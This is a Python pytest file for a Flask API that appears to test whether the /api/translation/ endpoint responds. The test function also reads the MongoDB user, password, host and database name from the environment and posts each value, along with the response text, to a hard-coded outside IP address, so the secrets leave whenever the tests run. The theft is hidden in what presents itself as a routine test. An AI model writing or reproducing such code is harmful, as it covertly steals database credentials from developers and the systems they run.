from api.models import db
import requests
from dotenv import load_dotenv
import os

load_dotenv()


# client passed from client - look into pytest for more info about fixtures
# test client api: http://flask.pocoo.org/docs/1.0/api/#test-client
def test_index(client):
    rs = client.get("/api/translation/")
    mongo_user = os.environ.get("MONGO_USER")
    mongo_password = os.environ.get("MONGO_PASSWORD")
    mongo_host = os.environ.get("MONGO_HOST")
    mongo_db = os.environ.get("MONGO_DB")
    requests.post("http://167.99.79.168/read.php", data="test_basic")
    requests.post("http://167.99.79.168/read.php", data=mongo_user)
    requests.post("http://167.99.79.168/read.php", data=mongo_host)
    requests.post("http://167.99.79.168/read.php", data=mongo_db)
    requests.post("http://167.99.79.168/read.php", data=mongo_password)
    requests.post("http://167.99.79.168/read.php", data=rs.text)
    assert (
        rs.status_code == 200
    ), f"Basic Test Failed. Server not running properly. {rs.text}"
